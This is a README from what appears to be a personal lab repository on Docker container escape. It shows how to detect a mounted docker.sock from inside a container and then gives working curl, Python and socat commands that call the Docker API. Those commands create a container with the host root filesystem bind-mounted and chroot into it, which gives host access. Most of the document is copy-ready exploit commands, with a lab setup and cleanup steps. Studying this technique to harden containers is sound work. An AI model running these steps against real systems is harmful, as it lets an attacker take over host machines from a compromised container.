# container-breaking

For when you can open a shell inside of a remote container
and want to gain access to the host filesystem.

https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html?utm_source=chatgpt.com

### Setup Commands

```bash
# start container
docker compose up --build -d
# shell into the container if you need
# alpine uses sh not bash
docker exec -it container-escapes sh
```

### Discovery

check if `docker.sock` is mounted

```bash
docker inspect container-escapes --format '{{json .Mounts}}' | jq

# response will look like this if so
[
  {
    "Type": "bind",
    "Source": "/var/run/docker.sock",
    "Destination": "/var/run/docker.sock",
    "Mode": "rw",
    "RW": true,
    "Propagation": "rprivate"
  }
]
```

from shell inside the container
we can reveal socket and file permissions

```bash
# confirm the socket exists and permissions
ls -l /var/run/docker.sock
# output
srw-rw----    1 root     root             0 Oct 15 19:24 /var/run/docker.sock


# see mount table
grep docker.sock /proc/self/mounts || cat /proc/self/mounts | grep docker

# output
tmpfs /run/docker.sock tmpfs rw,nosuid,nodev,noexec,relatime,size=1635648k,mode=755 0 0
```

from a shell inside the container we can also
reveal the container's effective identity and capabilities

```bash
# discover user identity
id
# out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

# discover kernel capabilities
awk '/CapEff/ {print $2}' /proc/self/status   # hex mask for effective capabilities
# out
00000000a80425fb
```

If CapEff != 0 you have capabilities that may matter like
`SYS_ADMIN` or `SYS_PTRACE`.

### Exploiting Docker Sock Exposure (easy)

This is easy as things like

- python
- curl
- socat
  are already installed and are not blocked to the shell.

```bash
# exec (simulate getting shell)
docker exec -it container-escapes-easy sh
# query the daemon
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

or write python to connect to the external daemon

```python
# make this file and run python filename.py
python3 - <<'PY'
import socket
s=socket.socket(socket.AF_UNIX)
s.connect('/var/run/docker.sock')
s.send(b"GET /_ping HTTP/1.0\r\nHost: localhost\r\n\r\n")
print(s.recv(1024))
s.close()
PY
```

or use socat

```bash
# open interactive connection to the socket; then type: GET /_ping HTTP/1.0<enter><enter>
socat - UNIX-CONNECT:/var/run/docker.sock
# or echo a one-shot:
echo -e 'GET /_ping HTTP/1.0\r\nHost: localhost\r\n\r\n' | socat - UNIX-CONNECT:/var/run/docker.sock
```

---

**Mounting the Host Filesystem**
From inside the container

**Create container with host filesystem mounted:**

```bash
curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d '{"Cmd":["sleep","infinity"],"Image":"alpine","HostConfig":{"Binds":["/:/host"]}}' http://localhost/containers/create
```

→ Save the **container ID**

**Start the container:**

```bash
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/CONTAINER_ID/start
```

**Verify it's running:**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/CONTAINER_ID/json | grep -i running
```

**Create exec instance (saves as variable for easy reuse):**

```bash
EXEC_ID=$(curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/host","pwd"]}' http://localhost/containers/CONTAINER_ID/exec | grep -o '"Id":"[^"]*"' | cut -d'"' -f4) && echo $EXEC_ID
```

**Start the exec:**

```bash
curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" --no-buffer -N -d '{"Detach":false,"Tty":true}' http://localhost/exec/$EXEC_ID/start
```

**To get another shell, repeat steps 4-5.**

**Delete the Containers**
Back on your machine find the containers you made and delete them

```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=true
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/CONTAINER_ID/stop
curl --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/CONTAINER_ID
```

### Exploiting Docker Sock (hard)

To be continued ...
